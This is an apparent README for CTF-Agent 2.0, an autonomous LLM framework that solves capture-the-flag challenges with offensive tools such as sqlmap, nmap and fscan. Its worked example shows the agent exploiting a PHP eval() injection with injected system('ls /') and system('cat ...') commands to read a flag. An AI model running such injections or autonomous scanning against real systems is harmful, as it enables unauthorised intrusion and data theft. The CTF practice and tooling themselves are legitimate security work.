# CTF-Agent 2.0

**极简Query循环 × AI完全自主决策**

CTF-Agent 2.0 是一个基于极简Query循环的智能CTF自动化求解框架。核心原则：**框架做得越少越好，AI做得越多越好**。

## 特点

- **极简Query循环**：~80行核心代码，框架只做消息传递+超时熔断+循环检测
- **AI完全自主**：工具选择、错误恢复、策略调整全部由AI决策
- **高成功率**：明确漏洞场景3-5轮内完成
- **防循环机制**：自动检测并警告重复调用

## 快速开始

### 安装

```bash
git clone https://github.com/your-repo/ctf-agent.git
cd ctf-agent
pip install -r requirements.txt
```

### 配置

创建 `settings.json`：

```json
{
  "model": {
    "name": "qwen3.5-plus",
    "base_url": "https://coding.dashscope.aliyuncs.com/v1/",
    "api_key": "${DASHSCOPE_API_KEY}"
  },
  "timeouts": {
    "ctf_single": 1800
  }
}
```

### 运行

```bash
python -m app.main "http://target.com"
```

## 架构

```
┌──────────────────────────────────────────────────────┐
│                  System Prompt                        │
│  (身份 + 规则 + Few-Shot，<1500字，无强制标记检查)     │
└──────────────────────┬───────────────────────────────┘
                       │
┌──────────────────────▼───────────────────────────────┐
│                   Query Loop                          │
│                                                       │
│   while not done:                                     │
│       response = llm.chat(messages, tools)            │
│       if has_tool_calls(response):                    │
│           results = execute_tools(response.tool_calls)│
│           messages.append(results)                    │
│       else:                                           │
│           done = True                                 │
│                                                       │
│   框架仅干预2件事：                                    │
│     1. 超时熔断（注入[TIMEOUT]消息）                   │
│     2. 循环检测（注入[LOOP_DETECTED]消息）             │
└──────────────────────────────────────────────────────┘
```

## 工具列表

| 类别 | 工具 | 说明 |
|------|------|------|
| 核心工具 | http_request, bash | 90%的Web测试用http_request完成 |
| 知识工具 | load_skill, list_skills | 加载领域知识包 |
| 记忆工具 | remember, recall | 记录/回忆发现 |
| Web漏洞 | sqlmap, ffuf | 确认漏洞后使用 |
| 信息收集 | nmap, nuclei | 未知目标时使用 |
| 内网渗透 | fscan | 内网综合扫描 |
| 云安全 | cloud_storage_check, cloud_metadata | 云环境利用 |
| AI安全 | ai_probe | AI模型探测 |

## 示例

### PHP代码注入

**目标**：`http://node5.anna.nssctf.cn:21013/`

**代码**：
```php
<?php
if(isset($_GET['url'])) {
    eval($_GET['url']);
}
?>
```

**执行过程**：
```
[Turn 1] AI: "I'll start by fetching the target URL..."
         Tool: http_request(url="http://...")
         Result: PHP代码

[Turn 2] AI: "I see a code injection vulnerability..."
         Tool: http_request(url="...?url=system('ls /')")
         Result: 文件列表

[Turn 3] AI: "Found a suspicious file..."
         Tool: http_request(url="...?url=system('cat /flllllaaaaaaggggggg')")
         Result: NSSCTF{...}

[Turn 4] AI: "Found the FLAG! NSSCTF{...}"
         Complete
```

**轮数**：4轮

## 文档

- [架构文档](docs/ARCHITECTURE.md)
- [API参考](docs/API_REFERENCE.md)
- [工作流文档](docs/WORKFLOW.md)
- [函数参考](docs/FUNCTIONS.md)
- [模块详解](docs/MODULES.md)
- [项目结构](docs/PROJECT_STRUCTURE.md)

## 核心设计

### 为什么极简？

**传统框架问题**：
- Skill注入：框架假设AI不知道何时加载Skill
- Self-Check Gates：框架不信任AI输出
- Meta-Cognition：框架强制AI报告状态
- 这些都是"框架做得太多，AI做得太少"

**极简方案**：
- Skill是工具，AI自己调用`load_skill`
- Memory是工具，AI自己调用`remember`/`recall`
- 提示词引导，不代码强制
- AI完全自主决策

### 为什么只有超时和循环检测？

**数学确定性**：
- **超时**：时间不可逆
- **循环检测**：相同输入=相同输出
- **其他**：都有不确定性，应该由AI判断

## 性能指标

| 指标 | 值 |
|------|---|
| Query循环代码行数 | ~80行 |
| 工具数量 | ~25个 |
| 提示词长度 | ~1200字 |
| 典型CTF完成轮数 | 3-5轮 |
| 最大轮数限制 | 200轮 |
| 默认超时 | 30分钟 |

## 对比Claude Code

| 特性 | Claude Code | CTF-Agent 2.0 |
|------|-------------|---------------|
| Query循环 | 极简管道 | 极简管道（完全一致） |
| 工具系统 | buildTool工厂 | buildTool工厂（完全一致） |
| 状态管理 | External Store | 简化为AgentState |
| 提示词 | 自主决策 | 自主决策（完全一致） |
| 框架干预 | 超时+循环检测 | 超时+循环检测（完全一致） |

## 许可证

MIT

## 贡献

欢迎提交Issue和Pull Request！